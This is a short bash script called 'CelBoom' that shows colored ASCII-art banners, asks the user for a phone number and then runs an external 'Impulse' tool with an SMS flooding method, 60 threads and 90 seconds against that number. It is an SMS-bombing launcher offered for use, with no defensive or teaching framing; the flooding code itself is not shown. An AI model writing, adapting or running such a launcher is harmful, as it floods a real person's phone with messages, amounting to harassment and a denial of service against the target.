#!/bin/bash
#
# Created by: Monkey-hk4
#
# 

function CelBoom {
	sleep 0.5
	clear
echo -e ""
echo -e ""
echo -e "\e[1;34m           ▄▄· ▄▄▄ .▄▄▌  \e[0m""\e[31m▄▄▄▄·             • ▌ ▄ ·. \e[0m"
echo -e "\e[1;34m          ▐█ ▌▪▀▄.▀·██•  \e[0m""\e[31m▐█ ▀█▪▪     ▪     ·██ ▐███▪\e[0m"
echo -e "\e[1;34m          ██ ▄▄▐▀▀▪▄██▪  \e[0m""\e[31m▐█▀▀█▄ ▄█▀▄  ▄█▀▄ ▐█ ▌▐▌▐█·\e[0m"
echo -e "\e[1;34m          ▐███▌▐█▄▄▌▐█▌▐▌\e[0m""\e[31m██▄▪▐█▐█▌.▐▌▐█▌.▐▌██ ██▌▐█▌\e[0m"
echo -e "\e[1;34m          ·▀▀▀  ▀▀▀ .▀▀▀ \e[0m""\e[31m·▀▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀  █▪▀▀▀\e[0m"
echo -e ""
sleep 0.5
echo -e "\e[1;30m                      ▄    ▄▄▄▄▄▄▄    ▄     "
echo -e "\e[1;30m                     ▀▀▄ ▄█████████▄ ▄▀▀    "
echo -e "\e[1;30m                         ██─▀███▀─██        "
echo -e "\e[1;30m                       ▄ ▀████▀████▀ ▄      "
echo -e "\e[1;30m                     ▀█    ██▀█▀██    █▀    "
echo ""                                                
sleep 0.5
echo -e "\e[32m                              2.1           "
echo -e ""
sleep 0.5
echo -e "\e[33m                      code by : Monkey-hk4   "

}

function PHONE {
echo -e -n "\e[36m
┌─┬┬┬┬──┬─┬┬┬─┐
│││││││││┴┤┌┤┼│
└┴─┴─┴┴┴┴─┴┘└─┘
\e[35m════\e[32m>>\e[0m"
read -r phone
}
#
# CÓDIGO
#
CelBoom
PHONE
cd Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${phone}
